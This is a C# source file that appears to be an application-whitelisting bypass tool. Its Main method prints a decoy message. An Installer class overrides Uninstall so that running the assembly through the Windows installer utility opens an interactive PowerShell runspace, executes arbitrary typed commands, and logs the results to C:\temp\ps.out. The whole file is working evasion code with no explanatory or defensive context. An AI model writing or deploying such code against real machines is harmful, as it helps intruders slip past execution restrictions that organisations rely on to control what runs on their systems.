using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        string outputFilePath = @"C:\temp\ps.out"; // Output file path

        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();

        using (StreamWriter writer = new StreamWriter(outputFilePath, true))
        {
            Console.CancelKeyPress += (sender, e) =>
            {
                Console.WriteLine("Session ended.");
                writer.Close();
                runspace.Dispose();
            };

            while (true)
            {
                Console.Write(">");
                Pipeline pipeline = runspace.CreatePipeline();
                string cmd = Console.ReadLine();
                pipeline.Commands.AddScript(cmd);
                pipeline.Commands.Add("Out-String");
                try
                {
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }

                    string output = stringBuilder.ToString().Trim();
                    Console.WriteLine(output); // Output to console
                    writer.WriteLine(output); // Write to file
                    writer.Flush(); // Flush content to ensure it's written immediately
                }
                catch (Exception e)
                {
                    string errorMessage = e.ToString();
                    Console.WriteLine(errorMessage); // Output error to console
                    writer.WriteLine(errorMessage); // Write error to file
                    writer.Flush(); // Flush content to ensure it's written immediately
                }
            }
        }
    }
}
